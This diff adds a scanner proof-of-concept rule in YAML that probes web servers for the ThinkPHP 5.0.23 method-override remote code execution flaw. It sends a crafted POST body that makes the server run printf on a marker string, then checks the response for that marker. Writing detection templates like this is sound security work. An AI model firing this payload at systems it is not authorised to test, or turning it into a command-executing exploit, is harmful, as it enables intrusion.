@@ -1,0 +1,13 @@
+name: poc-yaml-thinkphp5023-method-rce
+rules:
+  - method: POST
+    path: /index.php?s=captcha
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      _method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&get[]=1
+    expression: |
+      response.body.bcontains(b"TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1")
+detail:
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
